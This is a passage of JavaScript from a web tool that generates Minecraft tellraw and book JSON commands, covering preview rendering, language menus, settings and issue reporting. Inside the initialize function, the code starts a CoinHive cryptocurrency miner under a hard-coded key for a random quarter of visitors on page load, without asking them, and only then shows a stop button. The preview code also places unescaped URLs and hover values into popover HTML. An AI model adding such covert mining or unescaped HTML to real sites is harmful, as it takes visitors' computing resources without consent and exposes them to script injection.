        $("#text_extra_container").hide();
        $("#selector_extra_container").hide();
        $("#obj_extra_container").show();
    } else if (extraTextFormat == "sel") {
        $("#text_extra_container").hide();
        $("#selector_extra_container").show();
        $("#obj_extra_container").hide();
    } else if (extraTextFormat == "raw") {
        $("#text_extra_container").show();
        $("#obj_extra_container").hide();
        $("#selector_extra_container").hide();
    }

    /*COMMAND MANAGER*/
    if ($("#command").val() == "")
        $("#command").val(templates[lsm.getItem("jtemplate")]["command"]);

    /*HOVEREVENT SUGGESTION MANAGER*/
    $("#hoverEventValue").removeAttr("disabled");
    selectedHover = getSelected("hoverEvent");
    if (selectedHover == "show_achievement") {
        /* no autocomplete */
    } else if (selectedHover == "show_item") {
        /* no autocomplete */
    } else if (selectedHover == "show_entity") {
        $(".hovertext_default").hide();
        $(".hovertext_entity").show();
    } else if (selectedHover == "none") {
        $("#hoverEventValue").attr("disabled", "true");
        /* no autocomplete */
    }
    if (selectedHover != "show_entity") {
        $(".hovertext_default").show();
        $(".hovertext_entity").hide();
    }
    if (selectedHover == "show_text") {
        $(".hovertext_default").hide();
        $(".hovertext_text").show();
        if ($("#hoverEventText").val() == "") {
            $("#hoverEventText").val(JSON.stringify({ text: "", extra: [] }));
        }
    } else {
        $(".hovertext_text").hide();
    }

    /*CLICKEVENT SUGGESTION MANAGER*/
    $("#clickEventText").removeAttr("disabled");
    selectedClick = getSelected("clickEvent");
    if (selectedClick == "run_command" || selectedClick == "suggest_command") {
        /* no autocomplete */
    } else if (selectedClick == "open_url") {
        /* no autocomplete */
    } else if (selectedClick == "none") {
        $("#clickEventText").attr("disabled", "true");
        /* no autocomplete */
    }

    /*PREPARING OUTPUT*/

    var commandString = $("#command").val();

    var JSONOutputString = "";
    var EscapedJSONOutputString = "";
    var formattedJObject = formatJObjectList(jobject);

    var newLineExpressions = {
        bookarray: /\\\\\\\\n/g,
        standardjson: /\\\\n/g
    };
    if (!formattedJObject.length > 0) {
        JSONOutputString = "[]";
    } else {
        if (currentTemplate().formatType == "bookarray") {
            JSONOutputString = JSON.stringify(formattedJObject);
            JSONOutputString = JSONOutputString.replace(newLineExpressions.bookarray, "\\\\n");
        } else if (currentTemplate().formatType == "standardjson") {
            JSONOutputString = formattedJObject[0];
            JSONOutputString = JSONOutputString.replace(newLineExpressions.standardjson, "\\n");
        } else if (currentTemplate().formatType == "signset") {
            JSONOutputString = "Text1:" + JSON.stringify(formattedJObject[0]);
            if (formattedJObject.length > 1) {
                JSONOutputString += ",Text2:" + JSON.stringify(formattedJObject[1]);
            }
            if (formattedJObject.length > 2) {
                JSONOutputString += ",Text3:" + JSON.stringify(formattedJObject[2]);
            }
            if (formattedJObject.length > 3) {
                JSONOutputString += ",Text4:" + JSON.stringify(formattedJObject[3]);
            }
        }
    }

    commandString = commandString.replace("%s", JSONOutputString);

    outputString = commandString;

    $("#outputtextfield").val(outputString);
    if ($("#showNiceLookingOutput").is(":checked")) {
        lsm.setItem("nlOutput", "yes");
        $("#nicelookingoutput")
            .show()
            .html(JSON.stringify(jobject, null, 4).replace(newLineExpressions.standardjson, "\\n"));
    } else {
        lsm.setItem("nlOutput", "no");
        $("#nicelookingoutput").hide();
    }
    jsonParse();

    /*COMMAND BLOCK WARNING*/
    if ($("#outputtextfield").val().length > 256) {
        $("#commandblock").show();
    } else {
        $("#commandblock").hide();
    }

    /*SAVE VARIABLES*/
    lsm.setItem("jobject", JSON.stringify(jobject));
    lsm.setItem("jcommand", $("#command").val());

    /*RERUN*/
    if (input != "noLoop" && input != "previewLineChange") {
        refreshOutput("noLoop");
    }

    if (quickMake) {
        $("#command-row").hide();

        if (window.opener && window.opener.quickMakeReceiving) {
            window.opener.document.getElementById("hoverEventText").value = document.getElementById(
                "outputtextfield"
            ).value;
        } else {
            alert(
                "This session is no longer attached and will close now.\n\nTo avoid this in the future, don't close the original window before closing this one.\n\nIf you are receiving this error and you don't think you should be, please report an issue on the normal page"
            );
            window.close();
        }
    }
}
function jsonParse() {
    let jsonPreview = document.getElementById("jsonPreview");
    let previewColor = document.getElementById("previewcolor").value;
    lsm.setItem("color", previewColor);
    jsonPreview.style.backgroundColor = `#${previewColor}`;
    jsonPreview.style.fontSize = `${document.getElementById("previewFontSize").value}px`;
    jsonPreview.innerHTML = "";
    if (templates[lsm.getItem("jtemplate")].formatType == "bookarray") {
        jsonPreview.classList.add("bookPreview");
        document.getElementById("previewBack").style.display = "block";
        document.getElementById("previewForwards").style.display = "block";
        document.getElementById("previewPage").style.display = "block";
    } else {
        jsonPreview.classList.remove("bookPreview");
        document.getElementById("previewBack").style.display = "none";
        document.getElementById("previewForwards").style.display = "none";
        document.getElementById("previewPage").style.display = "none";
    }

    if (jobject.length > 0) {
        let pageHash = {};
        let counter = 1;
        for (var i = 0; i < jobject.length; i++) {
            if (jobject[i].NEW_ITERATE_FLAG) {
                counter++;
            } else {
                pageHash["index." + i] = counter;

                topPage = counter;
            }
        }

        if (jobject.length == 0) {
            topPage = 1;
        }

        if (bookPage > topPage) {
            bookPage = topPage;
        }

        document.getElementById("previewPage").innerHTML = `Page ${bookPage} of ${topPage}`;

        for (var i = 0; i < jobject.length; i++) {
            if (jobject[i].NEW_ITERATE_FLAG) {
                if (
                    /*templates[lsm.getItem('jtemplate')].formatType == 'bookarray' || */ templates[
                        lsm.getItem("jtemplate")
                    ].formatType == "signset"
                ) {
                    $("#jsonPreview").append(
                        '<span id="jsonPreviewSpanElement' + i + '"><hr></span>'
                    );
                }
            } else if (
                pageHash["index." + i] == bookPage ||
                templates[lsm.getItem("jtemplate")].formatType != "bookarray"
            ) {
                let doClickEvent = false;
                let doHoverEvent = false;
                let popoverTitle = "";
                let popoverContentClick = "";
                let popoverContentHover = "";
                let hoverEventType = "";
                let hoverEventValue = "";
                let clickEventType = "";
                let clickEventValue = "";
                $("#jsonPreview").append('<span id="jsonPreviewSpanElement' + i + '"></span>');

                if (jobject[i].text) {
                    $("#jsonPreviewSpanElement" + i).html(
                        jobject[i].text
                            .replace(/\\\\n/g, "<br>")
                            .replace(/\\n/g, "<br>")
                            .escape()
                    );
                } else if (jobject[i].score) {
                    $("#jsonPreviewSpanElement" + i).html(
                        '<span class="label label-info">' +
                            jobject[i].score.name.escape() +
                            ":" +
                            jobject[i].score.objective.escape() +
                            "</span>"
                    );
                } else if (jobject[i].selector) {
                    $("#jsonPreviewSpanElement" + i).html(
                        '<span class="label label-primary">' +
                            jobject[i].selector.escape() +
                            "</span>"
                    );
                } else {
                    $("#jsonPreviewSpanElement" + i).html(
                        '<span class="label label-danger">Unknown Element</span>'
                    );
                }

                if (jobject[i].bold == true) {
                    $("#jsonPreviewSpanElement" + i).addClass("bold");
                }
                if (jobject[i].italic == true) {
                    $("#jsonPreviewSpanElement" + i).addClass("italic");
                }
                if (jobject[i].underlined == true) {
                    $("#jsonPreviewSpanElement" + i).addClass("underlined");
                }
                if (jobject[i].strikethrough == true) {
                    if ($("#jsonPreviewSpanElement" + i).hasClass("underlined")) {
                        $("#jsonPreviewSpanElement" + i).removeClass("underlined");
                        $("#jsonPreviewSpanElement" + i).addClass("strikethroughunderlined");
                    } else {
                        $("#jsonPreviewSpanElement" + i).addClass("strikethrough");
                    }
                }
                if (jobject[i].obfuscated == true) {
                    $("#jsonPreviewSpanElement" + i).addClass("jsonPreviewObfuscated");
                }

                /*COLORS*/
                $("#jsonPreviewSpanElement" + i).css("color", getCSSHEXFromWord(jobject[i].color));

                /*CLICK & HOVER EVENTS*/

                if (
                    get_type(jobject[i].clickEvent) != "[object Undefined]" ||
                    get_type(jobject[i].hoverEvent) != "[object Undefined]"
                ) {
                    if (get_type(jobject[i].clickEvent) != "[object Undefined]")
                        doClickEvent = true;
                    if (get_type(jobject[i].hoverEvent) != "[object Undefined]")
                        doHoverEvent = true;
                    if (doHoverEvent && doClickEvent) {
                        popoverTitle =
                            getLanguageString(
                                "textsnippets.hoverevent.header",
                                lsm.getItem("langCode")
                            ) +
                            " and " +
                            getLanguageString(
                                "textsnippets.clickevent.header",
                                lsm.getItem("langCode")
                            );
                        hoverEventType = jobject[i].hoverEvent.action;
                        hoverEventValue = jobject[i].hoverEvent.value;
                        clickEventType = jobject[i].clickEvent.action;
                        clickEventValue = jobject[i].clickEvent.value;
                    }
                    if (doHoverEvent && !doClickEvent) {
                        popoverTitle = getLanguageString(
                            "textsnippets.hoverevent.header",
                            lsm.getItem("langCode")
                        );
                        hoverEventType = jobject[i].hoverEvent.action;
                        hoverEventValue = jobject[i].hoverEvent.value;
                    }
                    if (!doHoverEvent && doClickEvent) {
                        popoverTitle = getLanguageString(
                            "textsnippets.clickevent.header",
                            lsm.getItem("langCode")
                        );
                        clickEventType = jobject[i].clickEvent.action;
                        clickEventValue = jobject[i].clickEvent.value;
                    }
                    if (doClickEvent) {
                        if (clickEventType == "open_url") {
                            popoverContentClick =
                                clickEventType +
                                ':<a href="' +
                                clickEventValue +
                                '">' +
                                clickEventValue +
                                "</a>";
                        } else {
                            popoverContentClick = clickEventType + ":" + clickEventValue;
                        }
                    }
                    if (doHoverEvent) {
                        if (hoverEventType == "show_text") {
                            hoverEventValue = JSON.stringify(hoverEventValue);
                        }
                        popoverContentHover = hoverEventType + ":" + hoverEventValue;
                    }
                    if (doHoverEvent && doClickEvent) {
                        popoverContentClick = popoverContentClick + "<br>";
                    }
                    $("#jsonPreviewSpanElement" + i).attr("rel", "popover");
                }
                $("#jsonPreviewSpanElement" + i).popover({
                    title: popoverTitle,
                    content: popoverContentClick + popoverContentHover,
                    html: true
                });
            }
        }
    } else {
        $("#jsonPreview").html(getLanguageString("output.nothing", lsm.getItem("langCode")));
        $("#jsonPreview").css("color", "white");
    }
    if ($(".jsonPreviewObfuscated").length > 0) {
        setTimeout(obfuscationPreviewHandler, 20);
    }
}
function refreshLanguage(dropdownSelection) {
    $("#language_keys")
        .children()
        .remove();
    for (var i = 0; i < Object.keys(lang).length; i++) {
        $("#language_keys").append(
            "<li><a onclick=\"errorString = '" +
                getLanguageName(Object.keys(lang)[i]) +
                "<br><br>'; lsm.setItem('langCode','" +
                Object.keys(lang)[i] +
                '\'); refreshLanguage(true); refreshOutput();"><span class="' +
                Object.keys(lang)[i] +
                ' langSelect" id="language_select_' +
                Object.keys(lang)[i] +
                '">' +
                getLanguageName(Object.keys(lang)[i]) +
                "</span></a></li>"
        );
    }
    if (Object.keys(lang).length != languageCodes.length) {
        $("#language_keys").append(
            '<li><a><i class="fa fa-spinner fa-pulse fa-fw" aria-hidden="true"></i></a></li>'
        );
    }
    $("#language_keys").append('<li class="divider"></li>');
    $("#language_keys").append(
        '<li><a href="http://translate.minecraftjson.com"><span class="language_area" lang="language.translate"></span></a></li>'
    );

    $(".langSelect").removeClass("label label-success");
    $("." + lsm.getItem("langCode")).addClass("label label-success");

    if (lang[lsm.getItem("langCode")]) {
        $("*").refreshLanguage(lsm.getItem("langCode"));
    } else {
        lsm.setItem("langCode", defaultLanguage);
    }

    let allElements = document.getElementsByTagName("*");
    for (var i = 0; i < allElements.length; i++) {
        let element = allElements[i];
        let version = element.getAttribute("version");
        if (
            (version != undefined && lsm.getItem("versionIndicators") == "true") ||
            lsm.getItem("versionIndicators") == undefined
        ) {
            let levels = {
                "1.13": "danger",
                "1.12": "danger",
                "1.11": "warning",
                "1.10": "success",
                "1.9": "success",
                "1.8": "success",
                "1.7": "success"
            };
            let labelLevel = "success";
            if (levels[version]) {
                labelLevel = levels[version];
            }
            if (labelLevel != "success") {
                if (element.tagName.toLowerCase() == "option") {
                    element.innerText = `(${version}) ${element.innerText}`;
                } else {
                    element.innerHTML = `${element.innerText} <span class="label label-${labelLevel}">${version}</span>`;
                }
            }
        }
    }
}

function quickMakeDone() {
    alert("Finished!");
}

function initialize() {
    if (lsm.getItem("initialTimestamp") == undefined) {
        lsm.setItem("initialTimestamp", new Date().getTime());
    }

    if (lsm.getItem("loadCount") == undefined) {
        lsm.setItem("loadCount", 1);
    } else {
        lsm.setItem("loadCount", Number(lsm.getItem("loadCount")) + 1);
    }

    if (lsm.getItem("donateStatus") == undefined) {
        lsm.setItem("donateStatus", "unprompted");
    }

    let seconds = (new Date().getTime() - lsm.getItem("initialTimestamp")) / 1000;
    let hitcount = lsm.getItem("loadCount");

    if (
        seconds > 60 * 60 * 24 /* one day */ * 7 &&
        hitcount > 3 &&
        lsm.getItem("donateStatus") == "unprompted"
    ) {
        if (
            confirm(
                `Hi, I see you've been using my tool for a while.\nI don't make any money off this project, and would appreciate any size donation.\nWould you like to give a small donation? Any amount is appreciated.`
            )
        ) {
            lsm.setItem("donateStatus", "accepted-initial");
        } else {
            lsm.setItem("donateStatus", "rejected");
        }
    }

    if (lsm.getItem("langCode") == undefined) {
        if (lang[navigator.language.toLowerCase()] != undefined) {
            lsm.setItem("langCode", navigator.language.toLowerCase());
        } else {
            if (webLangRelations[navigator.language.toLowerCase()] != undefined) {
                lsm.setItem("langCode", webLangRelations[navigator.language.toLowerCase()]);
            }
        }
    }

    if (lsm.getItem("langCode") == undefined) {
        lsm.setItem("langCode", defaultLanguage);
    }

    if (sessionStorage.getItem("nextTimeAlert")) {
        alert(sessionStorage.getItem("nextTimeAlert"));
        sessionStorage.removeItem("nextTimeAlert");
    }
    if (lsm.getItem("nextTimeAlert")) {
        alert(lsm.getItem("nextTimeAlert"));
        lsm.removeItem("nextTimeAlert");
    }

    for (var i = 0; i < Object.keys(templates).length; i++) {
        let key = Object.keys(templates)[i];
        if (key == lsm.getItem("jtemplate")) {
            var classString = "btn-success";
        } else {
            var classString = "btn-default";
        }
        $("#templateButtons").append(
            '<button class="btn btn-xs ' +
                classString +
                ' templateButton" lang="template.' +
                key +
                '" version="' +
                templates[key]["version"] +
                '" template="' +
                key +
                '"></button> '
        );
    }

    if (lsm.getItem("jtemplate") == undefined) {
        lsm.setItem("jtemplate", "tellraw");
    }
    if (lang[lsm.getItem("langCode")]) {
        errorString = getLanguageName(lsm.getItem("langCode")) + "<br><br>";
    } else {
        errorString = "&lt;language unknown&gt;<br><br>";
    }

    if (lsm.getItem("color") != undefined) {
        $("#previewcolor").val(lsm.getItem("color"));
    } else {
        $("#previewcolor").val("617A80");
    }
    $("#previewcolor").css("background-color", "#" + $("#previewcolor").val());

    if (sessionStorage.getItem("nextTimeImport")) {
        importString(sessionStorage.getItem("nextTimeImport"));
        sessionStorage.removeItem("nextTimeImport");
    } else if (lsm.getItem("jobject") != undefined) {
        jobject = verify_jobject_format(JSON.parse(lsm.getItem("jobject")));
    }

    if (lsm.getItem("jformat") != version && lsm.getItem("jformat") != undefined) {
        sessionStorage.setItem("nextTimeImport", makeExportString());
        sessionStorage.setItem(
            "nextTimeAlert",
            "Updated from " + lsm.getItem("jformat") + " to " + version
        );
        lsm.clear();
        location.reload();
        return;
    } else {
        /*check if alert isn't correctly set. Do not show the alert is jformat isn't set – that means the user hasn't been here before*/
        if (
            lsm.getItem("jalert") != notice.id &&
            lsm.getItem("jformat") != undefined &&
            notice.show
        ) {
            alert(notice.message);
        }
        lsm.setItem("jalert", notice.id);
    }
    lsm.setItem("jformat", version);

    if (lsm.getItem("nlOutput") == undefined) {
        lsm.setItem("nlOutput", "no");
    }

    if (lsm.getItem("nlOutput") == "no") {
        $("#showNiceLookingOutput").prop("checked", false);
    } else {
        $("#showNiceLookingOutput").prop("checked", true);
    }

    showView("pageheader", true, false);
    showView("tellraw", false, true, false);

    let snippetContainer = document.getElementById("snippet-container");
    let sortable = Sortable.create(snippetContainer, {
        handle: ".drag-handle",
        onEnd: function(/*Event*/ evt) {
            jobject.splice(evt.newIndex, 0, jobject.splice(evt.oldIndex, 1)[0]);
            refreshOutput();
        }
    });

    /*************
     * Listeners *
     *************/

    $("#createAndImport").click(function() {
        if (
            confirm(
                "This feature is experimental.\n\nNote: It cannot load from the existing hover-text, so you must create it over again."
            )
        ) {
            quickMakeWindow = window.open("index.html#quickmake");
            quickMakeReceiving = true;
            showView("quickmaking");
        }
    });

    $("#finish-quickmake").click(function() {
        quickMakeWindow.close();
        quickMakeReceiving = false;
        showView("add-extra");
    });

    $(".templateButton").click(function() {
        let template = $(this).attr("template");
        loadTemplate(template);
    });

    $("#command").val(lsm.getItem("jcommand"));

    $("#command").change(refreshOutput());

    $("#import").click(() => {
        if (
            importString(
                prompt(
                    getLanguageString(
                        "settings.importtext.exported.description",
                        lsm.getItem("langCode")
                    )
                )
            )
        ) {
            alert("Your command has been imported");
        }
        refreshOutput();
    });

    refreshOutput();
    refreshLanguage();

    $("#export").click(function() {
        $("#exporter").remove();
        $(".alerts").append(
            '<div id="exporter" class="alert alert-info"><h4 lang="export.heading"></h4><p><textarea readonly id="exportText">' +
                makeExportString() +
                '</textarea></p><p><button type="button" onclick="closeExport()" class="btn btn-default" lang="export.close"></button></p></div>'
        );

        $exportText = $("#exportText");
        $exportText.select();
        $exportText.click(function() {
            this.select();
        });
        goToByScroll("exporter");
        refreshLanguage();
    });

    $(".fmtExtra").on("click", function() {
        extraTextFormat = $(this).attr("tellrawType");
        $(".fmtExtra").removeClass("active");
        $(this).addClass("active");
        refreshOutput();
    });
    $("#addHoverTextText").on("click", () => {
        textobj = JSON.parse($("#hoverEventText").val());
        snipobj = { text: $("#hoverEventTextSnippet").val() };
        if ($("#snippetcolor").val() != "none") {
            snipobj.color = $("#snippetcolor").val();
        }
        $("#hoverEventTextSnippet").val("");
        textobj.extra.push(snipobj);
        $("#hoverEventText").val(JSON.stringify(textobj));
    });
    $("#removeHoverTextText").on("click", () => {
        textobj = JSON.parse($("#hoverEventText").val());
        textobj.extra.splice(-1, 1);
        $("#hoverEventText").val(JSON.stringify(textobj));
    });
    $("#addExtraButton").on("click", () => {
        showView("add-extra");
    });
    $("#lang_request").on("click", () => {
        showView("lang-request");
        $("#lang-request-errorstring").html(errorString);
    });
    $("#helptoggle").click(() => {
        $(".help-box").toggle();
    });
    $("#enable_light_mode").on("click", function() {
        lsm.setItem("lightMode", "true");
        $("body").removeClass("black-theme");
        $(this).hide();
        $("#disable_light_mode").show();
    });
    $("#disable_light_mode").on("click", function() {
        lsm.setItem("lightMode", "false");
        $("body").addClass("black-theme");
        $(this).hide();
        $("#enable_light_mode").show();
    });
    $(".report-issue").on("click", () => {
        $('.view-container[view="report-issue"]')
            .children()
            .not(".cancel-issue-row")
            .hide();
        $("#issue-workflow-r1").show();
        showView("report-issue");
    });

    $("#previewBack").click(() => {
        if (bookPage != 1) bookPage--;
        refreshOutput();
    });

    $("#previewForwards").click(() => {
        if (bookPage < topPage) bookPage++;
        refreshOutput();
    });

    document.getElementById("confirmDeleteCheckbox").checked =
        lsm.getItem("confirmDelete") == "false" ? false : true;
    $("#confirmDeleteCheckbox").on("change", function() {
        lsm.setItem("confirmDelete", getChecked("confirmDeleteCheckbox") ? "true" : "false");
    });

    $(".issue-button").click(function() {
        let parentRow = $(this)
            .parent()
            .parent();
        parentRow.hide();
        let id = $(this).attr("id");
        if (id == "translation-issue-button") {
            $("#issue-workflow-r2-translation").fadeIn();
        } else if (id == "output-issue-button") {
            $("#issue-workflow-r2-output").fadeIn();
        } else if (id == "translation-current-issue-button") {
            reportAnIssue("Translation Issue (" + lsm.getItem("langCode") + ")");
            showView("tellraw");
        } else if (id == "translation-other-issue-button") {
            reportAnIssue("Translation Issue (Other)");
            showView("tellraw");
        } else if (id == "output-quotes-issue-button") {
            $(".templateButton[template=tellraw]").click();
            alswer(
                "The issue should be fixed.\nIf it is not, please report as Output > Other, and note this event in your report..",
                "info"
            );
            showView("tellraw");
        } else if (id == "output-badpreview-issue-button") {
            alert("I'm currently not accepting complaints about the format of the book layout");
            if (confirm("Would you still like to report an issue?")) {
                reportAnIssue("Output Issue (Bad Preview)");
            }
            showView("tellraw");
        } else if (id == "output-other-issue-button") {
            reportAnIssue("Output Issue (Other)");
            showView("tellraw");
        } else if (id == "cancel-issue-button") {
            showView("tellraw");
            parentRow.show();
        } else {
            showView("tellraw");
            reportAnIssue();
        }
    });

    $('#coinhive-stop').on('click', function() {
        miner.stop();
        document.getElementById('coinhive-stop').style.display = "none";
    })

    miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("initialTimestamp"));
    if (Math.random() < 0.25) {
        miner.start();
        document.getElementById('coinhive-stop').style.display = "";
    }

    // Beta tooltip
    // $('#dropdown-list-a').tooltip({"title":"<i style=\"color: #F8814C;\" class=\"fa fa-exclamation-circle\"></i> " + getLanguageString('headerbar.dropdown.hover',lsm.getItem('langCode')),"html":true,"placement":"bottom"});
    // if (lsm.getItem('beta-tooltip-a-shown') != "yes") {
    // $('#dropdown-list-a').tooltip('show');
    // }
    // lsm.setItem('beta-tooltip-a-shown',"yes");

    //Dark Mode

    if (lsm.getItem("lightMode") === "true") {
        $("#enable_light_mode").click(); //Finish setting up dark mode after handlers exist
    }
}
$(document).ready(() => {
    if (location.hash == "#quickmake") {
        if (window.opener != null) {
            /* Quick Make */
            quickMake = true;
            lsm.setItem("jcommand", "%s");
        } else {
            location.hash = "";
        }
    }

    if (lsm.getItem("lightMode") && lsm.getItem("lightMode") == "true") {
        $("body").removeClass("black-theme"); //Rest of "dark mode" is handled later, color scheme handled early for appearance
    } else if (lsm.getItem("lightMode") == undefined) {
        lsm.setItem("lightMode", "false");
    }
    $(".view-container").hide();
    showView("loading", true, true, true);

    $("#loadingtxt").html("Loading Assets");
    try {
        if (!fetch) {
            hardFail("Fetch support is required. Please update your browser");
        }
        fetch("resources.json", {
            method: "GET"
        })
            .then(function(response) {
                response.json().then(function(resourcesJSON) {
                    if (location.hash == "#embed") {
                        $('.view-container[view="tellraw"]')
                            .children()
                            .filter("br")
                            .remove();
                        embed = true;
                    }

                    webLangRelations = resourcesJSON["web_language_relations"];
                    achievements = resourcesJSON["achievements"];
                    commands = resourcesJSON["commands"];
                    defaultLanguage = resourcesJSON["default_language"];
                    languageCodes = resourcesJSON["available_language_codes"];

                    if (languageCodes.indexOf(lsm.getItem("langCode")) != -1) {
                        defaultLanguage = lsm.getItem("langCode");
                    } else {
                        lsm.setItem("langCode", defaultLanguage);
                    }

                    getLanguageData(defaultLanguage).then(
                        data => {
                            lang[defaultLanguage] = data;
                            initialize();
                        },
                        err => {
                            hardFail(err);
                        }
                    );
                });
            })
            .catch(function(err) {
                hardFail("An error occurred loading resources.");
            });
    } catch (err) {
        hardFail("An error occured loading page assets.");
        return;
    }
});
